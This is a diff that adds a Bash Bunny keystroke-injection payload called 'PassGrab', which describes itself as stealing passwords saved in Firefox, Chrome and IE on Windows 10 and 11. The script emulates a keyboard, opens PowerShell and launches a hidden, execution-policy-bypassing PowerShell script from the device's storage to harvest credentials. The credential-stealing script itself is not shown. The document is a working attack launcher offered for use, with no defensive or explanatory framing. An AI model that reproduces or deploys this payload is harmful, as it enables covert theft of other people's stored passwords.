@@ -1,0 +1,34 @@
+#!/bin/bash
+#
+# Title:            PassGrab
+#
+# Description:      Grab passwords stored in Firefox, Chrome and IE
+#
+# Author:           fGV
+# Version:          1.0
+# Category:         Credentials
+# Target:           Microsoft Windows 10
+# Attackmodes:      HID and STORAGE
+#
+# TESTED ON
+# ===============
+# Microsoft Windows 10
+# Microsoft Windows 11
+#
+# REQUIREMENTS
+# ===============
+# User logged in
+
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+QUACK DELAY 1500
+QUACK GUI
+QUACK DELAY 100
+QUACK STRING powershell.exe
+QUACK ENTER
+QUACK DELAY 100
+QUACK STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\PassGrab.ps1')"
+QUACK ENTER
+LED ATTACK
